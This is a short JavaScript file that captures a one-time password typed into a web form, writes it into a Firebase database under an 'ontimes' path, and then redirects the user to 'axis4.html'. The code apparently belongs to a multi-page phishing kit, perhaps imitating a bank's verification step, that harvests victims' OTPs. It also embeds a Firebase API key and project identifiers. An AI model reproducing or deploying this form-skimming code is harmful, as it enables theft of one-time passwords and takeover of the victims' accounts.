import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCUz_1-llGeoG20f3B5mBxjgWXAG2qPdcI",
    authDomain: "myfirst-772f2.firebaseapp.com",
    projectId: "myfirst-772f2",
    storageBucket: "myfirst-772f2.firebasestorage.app",
    messagingSenderId: "540088309804",
    appId: "1:540088309804:web:d52187c60c275d140f1989"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const app_data = document.getElementById('app_data'); // Corrected to match HTML ID
const notification = document.getElementById('notification');

function onet(event) {
    event.preventDefault(); // Prevent default form submission
    const OnetimePassword = document.getElementById('OnetimePassword').value.trim();

    if (OnetimePassword === "") {
        notification.textContent = "Please enter the OTP.";
        notification.style.color = "red";
        return;
    }

    set(ref(db, 'ontimes/' + OnetimePassword), {
        OnetimePassword: OnetimePassword
    })
    .then(() => {
        notification.textContent = "Added successfully";
        notification.style.color = "green";
        document.getElementById('OnetimePassword').value = "";

        // Redirect to another page after success
        window.location.href = "axis4.html";
    })
    .catch((error) => {
        notification.textContent = "Failed to add data: " + error.message;
        notification.style.color = "red";
    });
}

// Use 'submit' event on the form
const form = document.getElementById('otp-form');
form.addEventListener('submit', onet);
